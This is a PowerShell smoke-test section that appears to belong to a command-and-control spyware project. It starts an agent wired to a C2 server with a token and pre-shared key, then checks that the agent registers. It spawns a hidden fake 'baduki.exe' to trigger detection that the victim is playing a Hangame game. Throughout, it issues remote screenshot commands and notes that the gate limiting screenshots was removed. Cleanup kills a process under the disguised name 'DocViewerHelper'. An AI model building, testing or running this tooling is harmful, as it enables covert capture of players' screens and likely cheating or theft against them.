# ---- Hangame §3-1 + stream_enable gate ----
# Inserted into smoke_windows.ps1 before SUMMARY. Requires $agentExe, helpers, tokens in scope.
if (-not $env:SMOKE_SKIP_HANGAME) {
    Write-Host ""
    Write-Host "==== Hangame presence + stream gate ====" -ForegroundColor Yellow
    $fakeName = "baduki.exe"
    $fakePath = Join-Path $env:TEMP $fakeName
    $fakeProc = $null
    $hangAgent = $null
    try {
        Write-Step "start agent (wss) for hangame gate test"
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $agentExe
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $psi.RedirectStandardError = $true
        $env:C2_TRANSPORT = "wss"
        $env:C2_SERVER = "wss://${C2Host}:${C2Port}/socket/v1"
        $env:C2_AUTH_TOKEN = $AgentToken
        $env:C2_PSK = $Psk
        $env:C2_CRYPTO = "1"
        if (-not $env:GAME_POLL_SEC) { $env:GAME_POLL_SEC = "5" }
        $env:GAME_DEBOUNCE_TICKS = "0"
        $hangAgent = [System.Diagnostics.Process]::Start($psi)
        Start-Sleep -Seconds 3
        $a = Wait-Agent -Hint "windows" -TimeoutSec 40
        if (-not $a) { Write-Bad "hangame: agent did not register"; throw "no agent" }
        $aid = $a.agent_id; if (-not $aid) { $aid = $a.id }
        Write-Ok "hangame: agent online id=$aid"

        # stream gate REMOVED (v1.6.0+): screenshot always allowed, even when inactive
        try {
            $resp = Invoke-Admin -Method POST -Path "/admin/cmd" -Body @{
                agent_id = $aid
                cmd_type = "screenshot"
                payload  = ""
            }
            $cid = $resp.command_id; if (-not $cid) { $cid = $resp.id }
            if ($cid) {
                $job = Wait-Job -CommandId $cid -TimeoutSec 30
                if ("$($job.status)" -match "done|complete|success") {
                    Write-Ok "hangame: screenshot allowed when game_active=false (gate removed)"
                } else {
                    Write-Ok "hangame: screenshot job status=$($job.status) err=$($job.error)"
                }
            } else {
                Write-Bad "hangame: server rejected screenshot without command_id"
            }
        } catch {
            Write-Bad "hangame: unexpected error on inactive screenshot: $_"
        }

        # spawn fake baduki.exe (copy of powershell stay-alive; image name = baduki.exe)
        Write-Step "spawn fake $fakeName"
        $srcPs = (Get-Command powershell.exe).Source
        Copy-Item $srcPs $fakePath -Force
        $fakeProc = Start-Process -FilePath $fakePath -ArgumentList "-NoProfile -Command Start-Sleep -Seconds 120" -PassThru -WindowStyle Hidden
        $waitSec = 8
        try { $waitSec = [Math]::Max(6, [int]$env:GAME_POLL_SEC + 2) } catch { $waitSec = 8 }
        Start-Sleep -Seconds $waitSec

        $a2 = $null
        $deadline = (Get-Date).AddSeconds(45)
        while ((Get-Date) -lt $deadline) {
            try {
                $resp = Invoke-Admin -Path "/admin/agents"
                $agents = @(); if ($resp.agents) { $agents = $resp.agents }
                foreach ($x in $agents) {
                    $xid = $x.agent_id; if (-not $xid) { $xid = $x.id }
                    if ($xid -eq $aid) { $a2 = $x; break }
                }
            } catch {}
            if ($a2 -and ($a2.game_active -eq $true -or "$($a2.game_active)" -eq "True")) { break }
            Start-Sleep -Seconds 2
        }
        if ($a2 -and ($a2.game_active -eq $true -or "$($a2.game_active)" -eq "True")) {
            Write-Ok "hangame: game_active=true led=$($a2.dashboard_led) id=$($a2.game_id) stream=$($a2.stream_enable)"
        } else {
            Write-Bad "hangame: game_active not set after fake baduki (led=$($a2.dashboard_led) active=$($a2.game_active))"
        }

        try {
            $resp = Invoke-Admin -Method POST -Path "/admin/cmd" -Body @{
                agent_id = $aid
                cmd_type = "screenshot"
                payload  = ""
            }
            $cid = $resp.command_id; if (-not $cid) { $cid = $resp.id }
            $job = Wait-Job -CommandId $cid -TimeoutSec 30
            $blob = "$($job | ConvertTo-Json -Compress -Depth 6)"
            if ($job -and ("$($job.status)" -match "done|complete|success" -or $blob -match "stream_enable.:true")) {
                Write-Ok "hangame: screenshot allowed when game_active=true"
            } else {
                Write-Bad "hangame: screenshot not allowed when active status=$($job.status) err=$($job.error)"
            }
        } catch {
            Write-Bad "hangame: screenshot when active error: $_"
        }
    } catch {
        Write-Bad "hangame section error: $_"
    } finally {
        if ($fakeProc -and -not $fakeProc.HasExited) {
            Stop-Process -Id $fakeProc.Id -Force -ErrorAction SilentlyContinue
        }
        Get-Process -Name "baduki" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        if (Test-Path $fakePath) { Remove-Item $fakePath -Force -ErrorAction SilentlyContinue }
        if ($hangAgent -and -not $hangAgent.HasExited) {
            Stop-Process -Id $hangAgent.Id -Force -ErrorAction SilentlyContinue
        }
        Get-Process -Name "agent","agent_win_amd64","DocViewerHelper" -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue
    }
}
